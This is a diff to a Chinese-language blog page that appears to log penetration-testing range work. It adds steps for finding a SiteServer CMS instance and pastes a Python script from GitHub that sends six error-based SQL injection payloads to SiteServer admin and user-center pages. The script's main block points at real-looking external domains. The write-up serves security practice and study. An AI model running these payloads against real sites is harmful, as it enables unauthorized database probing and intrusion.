@@ -31,8 +31,9 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/%E6%9A%97%E6%9C%88/image-20240628001601684.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/%E6%9A%97%E6%9C%88/image-20240628001953849.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/%E9%A1%B9%E7%9B%AE7/image-20240721094804641.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/%E9%A1%B9%E7%9B%AE7/image-20240724111038117.png">
 <meta property="article:published_time" content="2024-06-27T15:51:22.000Z">
-<meta property="article:modified_time" content="2024-07-21T02:04:26.279Z">
+<meta property="article:modified_time" content="2024-07-24T03:14:53.336Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="靶场记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -236,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          172 words
+          2.3k words
         
       </span>
     
@@ -247,7 +248,7 @@
         
         
         
-          2 mins
+          19 mins
         
       </span>
     
@@ -319,6 +320,15 @@
 </li>
 <li><p>可以降低线程数量</p>
 <p>添加sleep 时间</p>
+</li>
+<li><p>通过目录扫描获取了siteserver </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/%E9%A1%B9%E7%9B%AE7/image-20240724111038117.png" srcset="/img/loading.gif" lazyload alt="image-20240724111038117"></p>
+<p>尝试弱密码 -&gt; 失败</p>
+<p>获取nday </p>
+<p>在github 上发现一个检测脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/evn python</span><br><span class="hljs-comment">#-*-:coding:utf-8 -*-</span><br><span class="hljs-comment">#Author:404</span><br><span class="hljs-comment">#Name:siteserver最新版3.6.4 sql inject漏洞大礼包of 1</span><br><span class="hljs-comment">#Refer:http://www.wooyun.org/corps/%E7%99%BE%E5%AE%B9%E5%8D%83%E5%9F%9F%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/page/2</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">assign</span>(<span class="hljs-params">service,arg</span>):<br>    <span class="hljs-keyword">if</span> service==<span class="hljs-string">&quot;siteserver&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>,arg <br><br><br><span class="hljs-keyword">def</span>  <span class="hljs-title function_">audit</span>(<span class="hljs-params">arg</span>):<br>    ps=[<br>        <span class="hljs-string">&#x27;siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&amp;DateFrom=&amp;DateTo=&amp;IsSuccess=All&#x27;</span>,<br>        <span class="hljs-string">&#x27;usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--&#x27;</span>,<br>        <span class="hljs-string">&#x27;siteserver/bbs/background_keywordsFilting.aspx?grade=0&amp;categoryid=0&amp;keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271&#x27;</span>,<br>        <span class="hljs-string">&#x27;siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&amp;PageNum=0&amp;Keyword=test&amp;AreaID=0&amp;LastActivityDate=0&amp;Order=UserName&#x27;</span>,<br>        <span class="hljs-string">&#x27;siteserver/userRole/background_user.aspx?PageNum=0&amp;Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&amp;CreateDate=0&amp;LastActivityDate=0&amp;TypeID=0&amp;DepartmentID=0&amp;AreaID=0&#x27;</span>,<br>        <span class="hljs-string">&#x27;siteserver/bbs/background_thread.aspx?UserName=test&amp;Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&amp;DateFrom=&amp;DateTo=&amp;ForumID=0&#x27;</span>,<br>        ]<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> ps:<br>        url=arg+p<br>        code,head,res,errcode,_=curl.curl2(url)<br>        <br>        <span class="hljs-keyword">if</span> code==<span class="hljs-number">500</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;GAOJIMicrosoft&quot;</span> <span class="hljs-keyword">in</span> res:<br>            security_hole(url)<br>        <br>        <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">from</span> dummy <span class="hljs-keyword">import</span> *<br>    audit(assign(<span class="hljs-string">&#x27;siteserver&#x27;</span>,<span class="hljs-string">&#x27;http://www.plhgyy.com/&#x27;</span>)[<span class="hljs-number">1</span>])<br>    <span class="hljs-comment">#audit(assign(&#x27;siteserver&#x27;,&#x27;http://www.zgktws.com/&#x27;)[1])</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试使用go 进行重构</p>
 </li>
 </ol>
 
